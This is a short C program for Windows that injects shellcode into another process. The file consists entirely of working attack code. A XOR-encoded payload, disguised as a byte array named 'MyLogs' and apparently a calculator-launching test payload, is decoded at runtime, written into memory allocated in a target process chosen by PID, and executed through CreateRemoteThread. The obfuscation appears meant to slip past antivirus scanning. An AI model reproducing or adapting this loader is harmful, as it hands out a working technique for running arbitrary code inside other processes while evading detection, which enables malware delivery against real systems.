#include <windows.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char** argv) {
    //note
    char MyLogs[] = "\xfa\x4e\x85\xe2\xf6\xee\xc6\x6\x6\x6\x47\x57\x47\x56\x54\x57\x50\x4e\x37\xd4\x63\x4e\x8d\x54\x66\x4e\x8d\x54\x1e\x4e\x8d\x54\x26\x4e\x8d\x74\x56\x4e\x9\xb1\x4c\x4c\x4b\x37\xcf\x4e\x37\xc6\xaa\x3a\x67\x7a\x4\x2a\x26\x47\xc7\xcf\xb\x47\x7\xc7\xe4\xeb\x54\x47\x57\x4e\x8d\x54\x26\x8d\x44\x3a\x4e\x7\xd6\x8d\x86\x8e\x6\x6\x6\x4e\x83\xc6\x72\x61\x4e\x7\xd6\x56\x8d\x4e\x1e\x42\x8d\x46\x26\x4f\x7\xd6\xe5\x50\x4e\xf9\xcf\x47\x8d\x32\x8e\x4e\x7\xd0\x4b\x37\xcf\x4e\x37\xc6\xaa\x47\xc7\xcf\xb\x47\x7\xc7\x3e\xe6\x73\xf7\x4a\x5\x4a\x22\xe\x43\x3f\xd7\x73\xde\x5e\x42\x8d\x46\x22\x4f\x7\xd6\x60\x47\x8d\xa\x4e\x42\x8d\x46\x1a\x4f\x7\xd6\x47\x8d\x2\x8e\x4e\x7\xd6\x47\x5e\x47\x5e\x58\x5f\x5c\x47\x5e\x47\x5f\x47\x5c\x4e\x85\xea\x26\x47\x54\xf9\xe6\x5e\x47\x5f\x5c\x4e\x8d\x14\xef\x51\xf9\xf9\xf9\x5b\x4e\xbc\x7\x6\x6\x6\x6\x6\x6\x6\x4e\x8b\x8b\x7\x7\x6\x6\x47\xbc\x37\x8d\x69\x81\xf9\xd3\xbd\xe6\x1b\x2c\xc\x47\xbc\xa0\x93\xbb\x9b\xf9\xd3\x4e\x85\xc2\x2e\x3a\x0\x7a\xc\x86\xfd\xe6\x73\x3\xbd\x41\x15\x74\x69\x6c\x6\x5f\x47\x8f\xdc\xf9\xd3\x65\x67\x6a\x65\x28\x63\x7e\x63\x6";



    DWORD Aclist = PROCESS_ALL_ACCESS;
    // open the process and save the handle
    HANDLE process_handle = OpenProcess(Aclist, FALSE, atoi(argv[1]));
    if (!process_handle)
    {
        printf("Error");
        printf("Re:%p", process_handle);

    }
    else {
        LPVOID pointer_after_allocated;
        pointer_after_allocated = VirtualAllocEx(process_handle, NULL, sizeof(MyLogs), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        printf("[+]Got the address to write 0x%p\n", pointer_after_allocated);
        int i;
        int n = 0;
        for (i = 0; i <= sizeof(MyLogs); i++) {
            char DecodedOpCode = MyLogs[i] ^ 0x06;
            if ((char*)pointer_after_allocated + n) {
                char* MyCounter = (char*)pointer_after_allocated + n;
                if (WriteProcessMemory(process_handle, MyCounter, &DecodedOpCode, 1, NULL)) {
                    n++;
                }
            }
        }
        if(pointer_after_allocated){
            LPTHREAD_START_ROUTINE MyROUTINE = (LPTHREAD_START_ROUTINE)pointer_after_allocated;
            if (CreateRemoteThread(process_handle, NULL, 100, MyROUTINE, NULL, 0, (LPDWORD)0x5151)) {
                printf("done");
            }
        }
    }
}


